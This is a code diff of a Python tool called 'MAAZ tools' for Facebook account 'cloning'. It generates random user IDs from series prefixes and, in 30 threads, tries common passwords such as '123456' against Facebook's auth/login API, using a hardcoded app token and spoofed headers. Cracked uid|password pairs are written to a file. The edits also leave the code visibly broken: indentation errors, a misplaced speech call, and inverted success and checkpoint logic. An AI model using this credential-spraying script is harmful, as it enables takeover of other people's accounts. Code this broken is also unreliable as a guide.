@@ -5,6 +5,7 @@ import bs4
 import ssl
 import json
 import time
+import requests
 import zlib
 import uuid
 import base64
@@ -248,10 +249,7 @@ def clear():
 
 def main():
     clear()
-    try:
         os.system('espeak -a 300 "Welcome to MAAZ tools"')
-    except:
-        pass
 
     animation = [
         "[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]",
@@ -265,7 +263,7 @@ def main():
         "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
         "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
     ]
-
+        os.system('espeak -a 300 "Thanks for using MAAZ tools"')
     for i in range(30):
         time.sleep(0.1)
         sys.stdout.write(
@@ -274,203 +272,86 @@ def main():
         sys.stdout.flush()
 
     clear()
-    print(
-        f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m2009\x1b[38;5;46m/\x1b[38;5;46m2010\x1b[38;5;46m]\033[1;97m'
-    )
-    print(
-        f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97mMIX CLONING \x1b[38;5;46m[\x1b[38;5;46m2011\x1b[38;5;46m/\x1b[38;5;46m2012\x1b[38;5;46m]\033[1;97m'
-    )
-    print(
-        f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97mRANDOM CLONING \x1b[38;5;46m[\x1b[38;5;46m2013\x1b[38;5;46m/\x1b[38;5;46m2014\x1b[38;5;46m]\033[1;97m'
-    )
-    print(
-        f'\x1b[38;5;46m[\033[1;97m0\x1b[38;5;46m] \033[1;97mEXIT PROGRAM\033[1;97m'
-    )
+    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97mOLD CLONING \x1b[38;5;46m[\x1b[38;5;46m2009\x1b[38;5;46m/\x1b[38;5;46m2010\x1b[38;5;46m]\033[1;97m')
     linex()
-
-    ch = input(
-        f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'
-    )
+    ch = input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m')
 
     if ch in ('1', '01', '11', 'a', 'A'):
-        OLD_CLONING()
-    elif ch in ('2', '02', '22', 'b', 'B'):
-        MIX_CLONING()
-    elif ch in ('3', '03', '33', 'c', 'C'):
-        RANDOM_CLONING()
-    elif ch in ('0', '00'):
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTHANKS FOR USING MAAZ TOOLS!'
-        )
-        try:
-            os.system('espeak -a 300 "Thanks for using MAAZ tools"')
-        except:
-            pass
-        sys.exit()
-    else:
-        print(
-            f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID SELECTION!'
-        )
-        time.sleep(2)
-        main()
-
+        SERIES_SELECTION()
 
 def OLD_CLONING():
+    SERIES_SELECTION()
+    
+
+def SERIES_SELECTION():
     user = []
     clear()
-    print(
-        f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999'
-    )
+    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECT SERIES FOR CLONING:')
     linex()
-    try:
-        limit = input(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'
-        )
-        limit = int(limit)
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(
-            f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER'
-        )
+    print(f'\x1b[38;5;46m[\033[1;97m1\x1b[38;5;46m] \033[1;97m100000 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m2\x1b[38;5;46m] \033[1;97m100001 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m3\x1b[38;5;46m] \033[1;97m100002 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m4\x1b[38;5;46m] \033[1;97m100003 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m5\x1b[38;5;46m] \033[1;97m100004 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m6\x1b[38;5;46m] \033[1;97m100005 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m7\x1b[38;5;46m] \033[1;97m100006 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m8\x1b[38;5;46m] \033[1;97m100007 Series')
+    print(f'\x1b[38;5;46m[\033[1;97m9\x1b[38;5;46m] \033[1;97m100008 Series')
+    linex()
+    
+    series_choice = input(f'\x1b[38;5;46m[\033[1;97m🎯\x1b[38;5;46m] \033[1;97mSELECT SERIES \x1b[38;5;46m▶ \033[1;97m')
+    
+    # Simple series mapping - just the selected code
+    series_map = {
+        '1': '100000',
+        '2': '100001', 
+        '3': '100002',
+        '4': '100003',
+        '5': '100004',
+        '6': '100005',
+        '7': '100006',
+        '8': '100007',
+        '9': '100008'
+    }
+    
+    if series_choice in series_map:
+        selected_series = series_map[series_choice]
+        START_SERIES_CLONING(selected_series)
+    else:
+        print(f'\x1b[38;5;160m[\033[1;97m❌\x1b[38;5;160m] \033[1;97mINVALID SELECTION!')
         time.sleep(2)
-        OLD_CLONING()
-        return
+        SERIES_SELECTION()
+
+def START_SERIES_CLONING(series_code):
+    user = []
+    clear()
+    
+    print(f'\x1b[38;5;46m[\033[1;97m🔥\x1b[38;5;46m] \033[1;97mSELECTED SERIES: \x1b[38;5;46m{series_code}')
+    print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999')
     linex()
-    year_code = '100001'
-    for i in range(limit):
-        data = str(random.choice(range(1000000000, 1999999999)))
+    limit = int(input(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'))
+    linex()
+    
+    # Generate IDs with selected series code (15 digits total)
+    for i in range(int(limit)):
+        data=str(random.choice(range(1000000000,1999999999)))
         user.append(data)
     with tred(max_workers=30) as jihad:
         clear()
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}'
-        )
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE '
-        )
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{len(user)}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
+        print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
         linex()
         for mal in user:
-            uid=year_code+mal
+            uid = series_code + mal
             jihad.submit(login1, uid)
+    
     line()
-    print(
-        f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!'
-    )
+    print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
     linex()
-    print(
-        f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}'
-    )
+    print(f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}')
     linex()
-    input(
-        f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m'
-    )
-    main()
-
-
-def MIX_CLONING():
-    user = []
-    clear()
-    print(
-        f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999'
-    )
-    linex()
-    try:
-        limit = input(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'
-        )
-        limit = int(limit)
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(
-            f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER'
-        )
-        time.sleep(2)
-        MIX_CLONING()
-        return
-    linex()
-    year_code = '100004'
-    for i in range(limit):
-        data = str(random.choice(range(1000000000, 1999999999)))
-        user.append(data)
-    with tred(max_workers=30) as jihad:
-        clear()
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}'
-        )
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE '
-        )
-        linex()
-        for mal in user:
-            uid=year_code+mal
-            jihad.submit(login2, uid)
-    line()
-    print(
-        f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!'
-    )
-    linex()
-    print(
-        f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}'
-    )
-    linex()
-    input(
-        f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m'
-    )
-    main()
-
-
-def RANDOM_CLONING():
-    user = []
-    clear()
-    print(
-        f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mEXAMPLE \x1b[38;5;46m  ▶ \033[1;97m10000\x1b[38;5;46m|\033[1;97m30000\x1b[38;5;46m|\033[1;97m50000\x1b[38;5;46m|\033[1;97m99999'
-    )
-    linex()
-    try:
-        limit = input(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSELECTION \x1b[38;5;46m▶ \033[1;97m'
-        )
-        limit = int(limit)
-        if limit <= 0:
-            raise ValueError
-    except ValueError:
-        print(
-            f'\x1b[38;5;46m[\033[1;97m❌\x1b[38;5;46m] \033[1;97mINVALID INPUT! PLEASE ENTER VALID NUMBER'
-        )
-        time.sleep(2)
-        RANDOM_CLONING()
-        return
-    linex()
-    year_code = '100005'
-    for i in range(limit):
-        data = str(random.choice(range(1000000000, 1999999999)))
-        user.append(data)
-    with tred(max_workers=30) as jihad:
-        clear()
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mTOTAL ID \x1b[38;5;46m▶ \033[1;97m{limit}'
-        )
-        print(
-            f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE '
-        )
-        linex()
-        for mal in user:
-            uid=year_code+mal
-            jihad.submit(login3, uid)
-    line()
-    print(
-        f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!'
-    )
-    linex()
-    print(
-        f'\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}'
-    )
-    linex()
-    input(
-        f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m'
-    )
+    input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
     main()
 
 
@@ -482,8 +363,7 @@ def login1(uid):
             f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
         )
         sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()    
+        ua = random.choice(ugen)    
         for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
             data = {
                 'adid': str(uuid.uuid4()),
@@ -535,214 +415,17 @@ def login1(uid):
                                headers=head,
                                allow_redirects=False,
                                verify=True).json()
-            if "session_key" in rp:
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m'
-                )
-                try:
-                    os.system('espeak -a 300 "Cracked Ok id"')
-                except:
-                    pass
-                try:
-                    open("/sdcard/OLD-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
-                except:
-                    open("OLD-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
+            if "session_key" in rp:            	
+                cps.append(uid)
                 break
             elif "www.facebook.com" in rp['error']['message']:
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m'
-                )
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop += 1
-    except Exception as e:
-        time.sleep(30)
-
-
-def login2(uid):
-    global oks, loop, cps
-    Session = requests.session()
-    try:
-        sys.stdout.write(
-            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB2\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
-        )
-        sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()  
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token':
-                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class':
-                'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            head = {
-                'User-Agent': ua,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id':
-                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-                'Content-Length': '706'
-            }
-            url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,
-                               data=data,
-                               headers=head,
-                               allow_redirects=False,
-                               verify=True).json()
-            if "session_key" in rp:
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m'
-                )
-                try:
-                    os.system('espeak -a 300 "Cracked Ok id"')
-                except:
-                    pass
-                try:
-                    open("/sdcard/MIX-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
-                except:
-                    open("MIX-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
+                print(f'\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mMAAZ\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m');os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/OLD_CLONING-OK.txt","a").write(uid+"|"+pw+"\n")
                 oks.append(uid)
                 break
-            elif "www.facebook.com" in rp.get("error", {}).get("message", ""):
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m'
-                )
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop += 1
-    except Exception as e:
-        time.sleep(30)
-
-
-def login3(uid):
-    global oks, loop, cps
-    Session = requests.session()
-    try:
-        sys.stdout.write(
-            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB3\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;46mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
-        )
-        sys.stdout.flush()
-        ua = random.choice(ugen)
-        ua = windows()
-        for pw in ["123456", "1234567", "12345678", "123456789", "111222"]:
-            data = {
-                'adid': str(uuid.uuid4()),
-                'format': 'json',
-                'device_id': str(uuid.uuid4()),
-                'cpl': 'true',
-                'family_device_id': str(uuid.uuid4()),
-                'credentials_type': 'device_based_login_password',
-                'error_detail_type': 'button_with_disabled',
-                'source': 'device_based_login',
-                'email': str(uid),
-                'password': str(pw),
-                'access_token':
-                '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                'generate_session_cookies': '1',
-                'meta_inf_fbmeta': '',
-                'advertiser_id': str(uuid.uuid4()),
-                'currently_logged_in_userid': '0',
-                'locale': 'en_US',
-                'client_country_code': 'US',
-                'method': 'auth.login',
-                'fb_api_req_friendly_name': 'authenticate',
-                'fb_api_caller_class':
-                'com.facebook.account.login.protocol.Fb4aAuthHandler',
-                'api_key': '882a8490361da98702bf97a021ddc14d'
-            }
-            head = {
-                'User-Agent': ua,
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'Host': 'graph.facebook.com',
-                'X-FB-Net-HNI': '25227',
-                'X-FB-SIM-HNI': '29752',
-                'X-FB-Connection-Type': 'MOBILE.LTE',
-                'X-Tigon-Is-Retry': 'False',
-                'x-fb-session-id':
-                'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-                'x-fb-device-group': '5120',
-                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-                'X-FB-Request-Analytics-Tags': 'graphservice',
-                'X-FB-HTTP-Engine': 'Liger',
-                'X-FB-Client-IP': 'True',
-                'X-FB-Server-Cluster': 'True',
-                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-                'Content-Length': '706'
-            }
-            url = "https://b-graph.facebook.com/auth/login"
-            rp = requests.post(url,
-                               data=data,
-                               headers=head,
-                               allow_redirects=False,
-                               verify=True).json()
-            if "session_key" in rp:
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\033[1;97m-\x1b[38;5;46mOK\x1b[38;5;46m] \x1b[38;5;46m{uid} \033[1;97m● \x1b[38;5;46m{pw}\033[1;97m'
-                )
-                try:
-                    os.system('espeak -a 300 "Cracked Ok id"')
-                except:
-                    pass
-                try:
-                    open("/sdcard/RANDOM-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
-                except:
-                    open("RANDOM-CLONING-OK.txt",
-                         "a").write(uid + "|" + pw + "\n")
-                oks.append(uid)
-                break
-            elif "www.facebook.com" in rp['error']['message']:
-                print(
-                    f'\r\r\r\r\r\x1b[38;5;196m[\x1b[38;5;196mMaaz\033[1;97m-\x1b[38;5;196mCP\x1b[38;5;196m] \x1b[38;5;196m{uid} \033[1;97m● \x1b[38;5;196m{pw}\033[1;97m'
-                )
-                cps.append(uid)
-                break
-            else:
-                continue
-        loop += 1
-    except Exception as e:
-        time.sleep(30)
-
+            else:continue
+        loop+=1
+    except Exception as e:time.sleep(30)
 
 if __name__ == "__main__":
     try:
